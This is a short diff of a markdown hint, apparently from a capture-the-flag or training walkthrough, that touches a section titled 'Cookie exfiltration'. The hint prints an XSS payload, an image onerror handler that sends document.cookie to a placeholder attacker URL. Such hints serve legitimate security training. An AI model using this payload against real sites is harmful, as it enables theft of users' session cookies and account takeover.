@@ -462,7 +462,9 @@ When registering a new user the endpoint `/api/Users` is contacted. This looks i
 
 <details>
   <summary>❓ Hint 3 (Cookie exfiltration)</summary>
+
 Have you tried the following?
+
 ```
 <img src=x onerror="this.src='YOUR.URL?'+document.cookie; this.removeAttribute('onerror');">
 ```
